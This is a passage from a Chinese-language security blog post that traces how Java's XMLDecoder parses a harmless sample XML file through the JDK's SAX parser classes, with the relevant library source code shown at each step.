<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="XMLDecoder解析流程分析（可不看）"><a href="#XMLDecoder解析流程分析（可不看）" class="headerlink" title="XMLDecoder解析流程分析（可不看）"></a>XMLDecoder解析流程分析（可不看）</h3><p>参考了p1g3师傅的文章，但是文章在p牛的知识星球，并且没有找到公开文章链接。感兴趣可以加入p牛知识星球搜索Weblogic XMLDecoder。</p>
<p>用下面这段分析正常xml文件的解析流程</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_65&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;MyObject&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>example<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">int</span>&gt;</span>123<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反序列化成对象的代码片段</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XMLDecoderExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.xml&quot;</span>);</span><br><span class="line">             <span class="type">XMLDecoder</span> <span class="variable">decoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(fis)) &#123;</span><br><span class="line">            <span class="comment">// 反序列化对象</span></span><br><span class="line">            <span class="type">MyObject</span> <span class="variable">obj</span> <span class="operator">=</span> (MyObject) decoder.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想获取xml文件输入流，然后作为参数初始化一个XMLDecoder对象，接着调用这个对象的readObject方法开始反序列化。其中调用parsingComplete()方法解析相关内容，如果返回结果为true，就会将array数组中的对象返回除了，也就是从xml文件中反序列化出来的对象，否则，返回null。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (parsingComplete())</span><br><span class="line">            ? <span class="built_in">this</span>.array[<span class="built_in">this</span>.index++]</span><br><span class="line">            : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进入parsingComplete()方法，有一些判断语句，我们看一下this(原代码中初始化的XMLDecoder)对象中的数据。</p>
<img src="./images/image-20240910001404857.png" alt="image-20240910001404857" style="zoom: 50%;" />

<p>我们要反序列化的xml文件的文件输入流在this.input中。通过得到的数据，很容易判断，会一路来到<code>AccessController.doPrivileged</code>语句中。<br>然后使用 <code>AccessController.doPrivileged</code> 在特权模式下执行解析操作。这段代码创建一个匿名 <code>PrivilegedAction</code> 实现，并在其中调用 <code>XMLDecoder.this.handler.parse(XMLDecoder.this.input)</code>，启动解析过程。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">parsingComplete</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.array == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.acc == <span class="literal">null</span>) &amp;&amp; (<span class="literal">null</span> != System.getSecurityManager())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;AccessControlContext is not set&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                XMLDecoder.<span class="built_in">this</span>.handler.parse(XMLDecoder.<span class="built_in">this</span>.input);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="built_in">this</span>.acc);</span><br><span class="line">        <span class="built_in">this</span>.array = <span class="built_in">this</span>.handler.getObjects();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>来到<code>DocumentHandler#parse</code>方法中，可以看到，这里主要是使用了 <code>SAXParserFactory</code> 创建 <code>SAXParser</code> 实例(<code>Simple API for XML </code>解析器)，并使用 <code>parse</code> 方法解析传入的 <code>input</code>，而我们<code>xml</code>相关数据就在<code>input</code>中。我们跟进去 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parse</span><span class="params">(<span class="keyword">final</span> InputSource input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">this</span>.acc == <span class="literal">null</span>) &amp;&amp; (<span class="literal">null</span> != System.getSecurityManager())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;AccessControlContext is not set&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">AccessControlContext</span> <span class="variable">stack</span> <span class="operator">=</span> AccessController.getContext();</span><br><span class="line">    SharedSecrets.getJavaSecurityAccess().doIntersectionPrivilege(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                SAXParserFactory.newInstance().newSAXParser().parse(input, DocumentHandler.<span class="built_in">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (ParserConfigurationException exception) &#123;</span><br><span class="line">                handleException(exception);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (SAXException wrapper) &#123;</span><br><span class="line">                <span class="type">Exception</span> <span class="variable">exception</span> <span class="operator">=</span> wrapper.getException();</span><br><span class="line">                <span class="keyword">if</span> (exception == <span class="literal">null</span>) &#123;</span><br><span class="line">                    exception = wrapper;</span><br><span class="line">                &#125;</span><br><span class="line">                handleException(exception);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (IOException exception) &#123;</span><br><span class="line">                handleException(exception);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, stack, <span class="built_in">this</span>.acc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>来到<code>SAXParserImpl#parse</code>，首先，它检查输入源也就是我们前面提到的<code>input</code>。接下来，如果提供了处理器 <code>DefaultHandler</code>，则将其设置为 <code>xmlReader</code> 的内容处理器、实体解析器、错误处理器和 DTD 处理器，同时取消设置旧的文档处理器。</p>
<p><code>DefaultHandler</code>里面封装了很多标签对应的<code>Handler</code></p>
<img src="./images/image-20240910010438656.png" alt="image-20240910010438656"  />

<p>最后，使用 <code>xmlReader</code> 解析输入源<code>input</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parse</span><span class="params">(InputSource is, DefaultHandler dh)</span></span><br><span class="line">    <span class="keyword">throws</span> SAXException, IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (is == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dh != <span class="literal">null</span>) &#123;</span><br><span class="line">        xmlReader.setContentHandler(dh);</span><br><span class="line">        xmlReader.setEntityResolver(dh);</span><br><span class="line">        xmlReader.setErrorHandler(dh);</span><br><span class="line">        xmlReader.setDTDHandler(dh);</span><br><span class="line">        xmlReader.setDocumentHandler(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlReader.parse(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>xmlReader.parse(is)</code>，也就是重构的<code>SAXParserImpl#parse</code>。这里if的判断不通过，我们不会进入if语句。直接进入<code>super.parse(inputSource)</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parse</span><span class="params">(InputSource inputSource)</span></span><br><span class="line">    <span class="keyword">throws</span> SAXException, IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (fSAXParser != <span class="literal">null</span> &amp;&amp; fSAXParser.fSchemaValidator != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fSAXParser.fSchemaValidationManager != <span class="literal">null</span>) &#123;</span><br><span class="line">            fSAXParser.fSchemaValidationManager.reset();</span><br><span class="line">            fSAXParser.fUnparsedEntityHandler.reset();</span><br><span class="line">        &#125;</span><br><span class="line">        resetSchemaValidator();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">super</span>.parse(inputSource);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>来到<code>AbstractSAXParser#parse</code>，首先创建一个新的 <code>XMLInputSource</code> 对象，传入 <code>InputSource</code> 的公共标识符（Public ID）和系统标识符（System ID），第三个参数为 <code>null</code>，表示没有基础 URI。然后从 <code>InputSource</code> 获取字节流、字符流和编码信息，并设置到 <code>XMLInputSource</code> 对象中。这样可以确保所有必要的流和编码信息都被传递给 <code>XMLInputSource</code>。随后，接着调用重构的<code>parse</code>方法解析刚刚创建<code>xmlInputSource</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parse</span><span class="params">(InputSource inputSource)</span></span><br><span class="line">    <span class="keyword">throws</span> SAXException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// parse document</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">XMLInputSource</span> <span class="variable">xmlInputSource</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">XMLInputSource</span>(inputSource.getPublicId(),</span><br><span class="line">                               inputSource.getSystemId(),</span><br><span class="line">                               <span class="literal">null</span>);</span><br><span class="line">        xmlInputSource.setByteStream(inputSource.getByteStream());</span><br><span class="line">        xmlInputSource.setCharacterStream(inputSource.getCharacterStream());</span><br><span class="line">        xmlInputSource.setEncoding(inputSource.getEncoding());</span><br><span class="line">        parse(xmlInputSource);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wrap XNI exceptions as SAX exceptions</span></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// parse(InputSource)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里重构的parse方法，实现是在父类的父类中，即<code>XMLParse#parse</code>。这里初始化了一些安全相关的配置，并重置了解析器的状态。然后调用配置对象的解析方法<code>XML11Configuration#parse</code>，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parse</span><span class="params">(XMLInputSource inputSource)</span></span><br><span class="line">    <span class="keyword">throws</span> XNIException, IOException &#123;</span><br><span class="line">    <span class="comment">// null indicates that the parser is called directly, initialize them</span></span><br><span class="line">    <span class="keyword">if</span> (securityManager == <span class="literal">null</span>) &#123;</span><br><span class="line">        securityManager = <span class="keyword">new</span> <span class="title class_">XMLSecurityManager</span>(<span class="literal">true</span>);</span><br><span class="line">        fConfiguration.setProperty(Constants.SECURITY_MANAGER, securityManager);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (securityPropertyManager == <span class="literal">null</span>) &#123;</span><br><span class="line">        securityPropertyManager = <span class="keyword">new</span> <span class="title class_">XMLSecurityPropertyManager</span>();</span><br><span class="line">        fConfiguration.setProperty(Constants.XML_SECURITY_PROPERTY_MANAGER, securityPropertyManager);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    reset();</span><br><span class="line">    fConfiguration.parse(inputSource);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>来到<code>XML11Configuration#parse</code>，调用 <code>setInputSource(source)</code> 方法设置输入源，并调用 <code>parse(true)</code> 方法进行实际的解析。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parse</span><span class="params">(XMLInputSource source)</span> <span class="keyword">throws</span> XNIException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fParseInProgress) &#123;</span><br><span class="line">        <span class="comment">// REVISIT - need to add new error message</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">XNIException</span>(<span class="string">&quot;FWK005 parse may not be called while parsing.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fParseInProgress = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        setInputSource(source);</span><br><span class="line">        parse(<span class="literal">true</span>);</span><br><span class="line">    &#125; </span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到重构的<code>XML11Configuration#parse</code>中，方法首先检查 <code>fInputSource</code> 是否为非空，如果是，则重置验证管理器和版本检测器，更新配置状态，并根据文档的版本初始化相关的解析组件。具体来说，如果是 XML 1.1 版本，则初始化 XML 1.1 组件并配置相关管道，否则配置默认管道。接着调用 <code>fVersionDetector.startDocumentParsing</code> 方法开始解析文档，并将 <code>fInputSource</code> 设为 <code>null</code>。在后续的 <code>try</code> 块中，调用 <code>fCurrentScanner.scanDocument(complete)</code> 方法进行实际的文档扫描，并返回扫描结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">parse</span><span class="params">(<span class="type">boolean</span> complete)</span> <span class="keyword">throws</span> XNIException, IOException &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// reset and configure pipeline and set InputSource.</span></span><br><span class="line">    <span class="keyword">if</span> (fInputSource != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fValidationManager.reset();</span><br><span class="line">            fVersionDetector.reset(<span class="built_in">this</span>);</span><br><span class="line">            fConfigUpdated = <span class="literal">true</span>;</span><br><span class="line">            resetCommon();</span><br><span class="line"></span><br><span class="line">            <span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> fVersionDetector.determineDocVersion(fInputSource);</span><br><span class="line">            <span class="keyword">if</span> (version == Constants.XML_VERSION_1_1) &#123;</span><br><span class="line">                initXML11Components();</span><br><span class="line">                configureXML11Pipeline();</span><br><span class="line">                resetXML11();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                configurePipeline();</span><br><span class="line">                reset();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// mark configuration as fixed</span></span><br><span class="line">            fConfigUpdated = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// resets and sets the pipeline.</span></span><br><span class="line">            fVersionDetector.startDocumentParsing((XMLEntityHandler) fCurrentScanner, version);</span><br><span class="line">            fInputSource = <span class="literal">null</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fCurrentScanner.scanDocument(complete);</span><br><span class="line">    &#125; </span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们跟进<code>fCurrentScanner.scanDocument(complete)</code>，也就是<code>XMLDocumentFragmentScannerImpl#scanDocument</code>这段代码通过一个事件驱动的机制来解析XML内容，并调用相应的回调方法来处理不同类型的XML事件。具体来说，这个方法通过一个事件循环来获取和处理XML事件，具体的解析工作在 <code>next()</code> 方法中完成，<code>scanDocument</code> 方法用于处理这些解析后的事件。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">scanDocument</span><span class="params">(<span class="type">boolean</span> complete)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, XNIException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// keep dispatching &quot;events&quot;</span></span><br><span class="line">    fEntityManager.setEntityHandler(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">//System.out.println(&quot; get Document Handler in NSDocumentHandler &quot; + fDocumentHandler );</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">event</span> <span class="operator">=</span> next();</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (event) &#123;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.START_DOCUMENT :</span><br><span class="line">                <span class="comment">//fDocumentHandler.startDocument(fEntityManager.getEntityScanner(),fEntityManager.getEntityScanner().getVersion(),fNamespaceContext,null);// not able to get</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.START_ELEMENT :</span><br><span class="line">                <span class="comment">//System.out.println(&quot; in scann element&quot;);</span></span><br><span class="line">                <span class="comment">//fDocumentHandler.startElement(getElementQName(),fAttributes,null);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.CHARACTERS :</span><br><span class="line">                fDocumentHandler.characters(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.SPACE:</span><br><span class="line">                <span class="comment">//check if getCharacterData() is the right function to retrieve ignorableWhitespace information.</span></span><br><span class="line">                <span class="comment">//System.out.println(&quot;in the space&quot;);</span></span><br><span class="line">                <span class="comment">//fDocumentHandler.ignorableWhitespace(getCharacterData(), null);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.ENTITY_REFERENCE :</span><br><span class="line">                <span class="comment">//entity reference callback are given in startEntity</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.PROCESSING_INSTRUCTION :</span><br><span class="line">                fDocumentHandler.processingInstruction(getPITarget(),getPIData(),<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.COMMENT :</span><br><span class="line">                <span class="comment">//System.out.println(&quot; in COMMENT of the XMLNSDocumentScannerImpl&quot;);</span></span><br><span class="line">                fDocumentHandler.comment(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.DTD :</span><br><span class="line">                <span class="comment">//all DTD related callbacks are handled in DTDScanner.</span></span><br><span class="line">                <span class="comment">//1. Stax doesn&#x27;t define DTD states as it does for XML Document.</span></span><br><span class="line">                <span class="comment">//therefore we don&#x27;t need to take care of anything here. So Just break;</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.CDATA:</span><br><span class="line">                fDocumentHandler.startCDATA(<span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//xxx: check if CDATA values comes from getCharacterData() function</span></span><br><span class="line">                fDocumentHandler.characters(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">                fDocumentHandler.endCDATA(<span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//System.out.println(&quot; in CDATA of the XMLNSDocumentScannerImpl&quot;);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.NOTATION_DECLARATION :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.ENTITY_DECLARATION :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.NAMESPACE :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.ATTRIBUTE :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.END_ELEMENT :</span><br><span class="line">                <span class="comment">//do not give callback here.</span></span><br><span class="line">                <span class="comment">//this callback is given in scanEndElement function.</span></span><br><span class="line">                <span class="comment">//fDocumentHandler.endElement(getElementQName(),null);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>(<span class="string">&quot;processing event: &quot;</span> + event);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//System.out.println(&quot;here in before calling next&quot;);</span></span><br><span class="line">        event = next();</span><br><span class="line">        <span class="comment">//System.out.println(&quot;here in after calling next&quot;);</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (event!=XMLStreamConstants.END_DOCUMENT &amp;&amp; complete);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(event == XMLStreamConstants.END_DOCUMENT) &#123;</span><br><span class="line">        fDocumentHandler.endDocument(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 